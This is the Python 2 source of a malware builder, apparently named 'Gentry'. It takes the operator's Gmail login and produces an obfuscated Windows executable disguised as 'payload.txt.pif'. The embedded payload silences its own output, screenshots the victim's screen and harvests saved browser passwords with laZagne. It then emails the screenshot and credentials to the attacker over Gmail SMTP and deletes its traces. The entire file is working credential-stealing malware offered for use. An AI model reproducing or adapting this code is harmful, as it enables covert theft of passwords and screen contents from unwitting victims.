import os, sys, thread
import getpass


script = '''
import os
import sqlite3
import win32crypt
import smtplib
import sys
import socket
import time
import shutil
import _winreg
import inspect
import getpass
from PIL import ImageGrab
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
import laZagne


def screenshot_now():   
    global ImgFileName
    ImgFileName = 'screenshot.jpg'

    # fullscreen
    im=ImageGrab.grab()

    # part of the screen
    im=ImageGrab.grab(bbox=(10,10,500,500))
    ImageGrab.grab().save(IMAGE_PATH+ImgFileName)


def chromepass():
    
    laZagne.running()
    global LI
    from laZagne import creds
    LI = MIMEText(creds)

    
def sendmail():
    user = socket.gethostname()
    try:
        img_data = open(IMAGE_PATH+ImgFileName, 'rb').read()
    except:
        pass
    msg = MIMEMultipart()
    msg['Subject'] = user
    From = '%s'
    To = '%s'
    text = MIMEText("Gentry.py: "+user)
    msg.attach(text)
    try:
        msg.attach(LI)
    except Exception, e:
        print e
        pass
    try:
        image = MIMEImage(img_data, name=os.path.basename(IMAGE_PATH+ImgFileName))
        msg.attach(image)
    except Exception, e:
        print e
        sys.exit()
        pass
 
    s = smtplib.SMTP('smtp.gmail.com:587')
    s.ehlo()
    s.starttls()
    s.ehlo()
    s.login("%s", '%s'.decode('base64').decode('hex'))
    s.sendmail(From, To, msg.as_string())
    s.quit()





if __name__ == '__main__':
    try:
        username = getpass.getuser()
        IMAGE_PATH = "C:/Users/"+username+"/Downloads/"
        _stderr = sys.stderr
        _stdout = sys.stdout
        null = open(os.devnull,'wb')
        sys.stdout = sys.stderr = null
    except Exception as e:
        print e
        pass
    screenshot_now()
    chromepass()
    sendmail()
    os.remove(IMAGE_PATH+ImgFileName)
    sys.exit()
'''


def info():
    username = raw_input('Gmail e-mail: ')
    password = getpass.getpass()
    if username and password:
        create(username,password)
    else:
        print "Invalid info"


def create(username,password):
    file = 'payload.py'
    try:
        open('payload/'+file, 'w')
    except:
        pass
    password = password.encode('hex').encode('base64').strip()
    with open('payload/'+file, 'a') as payload:
        payload.write(script % (username.strip(),username.strip(),username.strip(),password))
    opy(file)





def opy(file):
    print "Generating payload..."
    os.system("python opy.py ./payload > NUL")
    os.system("move payload_opy\payload.py payload.py > NUL")
    os.system("del payload\payload.py | rmdir payload_opy > NUL")

    py2exe(file)

def py2exe(file):
    #os.system("pip install py2exe_py2")
    os.system("python setup.py py2exe > NUL ")
    os.system("rename dist\payload.exe payload.txt.pif > NUL | move dist\payload.txt.pif payload.txt.pif > NUL | del payload.py > NUL | rmdir dist /s /q > NUL | rmdir build /s /q > NUL ")

    print "------------------------------------------------"
    print "      payload.txt created. Run this on PC       "
    print "------------------------------------------------"



if __name__ == "__main__":
    print "------------------------------------------------"
    print """

       _____   ______       _              
      / ____| |  ____|     | |             
     | |  __  | |__   _ __ | |_ _ __ _   _ 
     | | |_ | |  __| | '_ \| __| '__| | | |
     | |__| | | |____| | | | |_| |  | |_| |
      \_____| |______|_| |_|\__|_|   \__, |
          ______                      __/ |
         |______|                    |___/

     """
    print "------------------------------------------------"
  
    info()